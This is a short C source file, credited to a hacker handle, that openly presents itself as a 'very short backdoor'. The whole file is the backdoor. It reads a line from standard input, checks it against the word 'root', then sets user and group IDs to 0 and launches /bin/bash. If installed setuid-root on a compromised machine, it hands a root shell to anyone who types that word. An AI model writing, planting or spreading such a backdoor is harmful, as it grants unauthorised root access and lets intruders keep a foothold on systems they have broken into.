// fastback.c - by Permission Denied
// very short backdoor with access control

#include <stdio.h>

main()
{
 char s[20];
 fgets(s, 20, stdin);
 if(strcmp(s,"root\n")!=0) {
  fprintf(stderr, "Only root can run this!\n");
  return;
  }
 setuid(0);
 setgid(0);
 system("/bin/bash");
}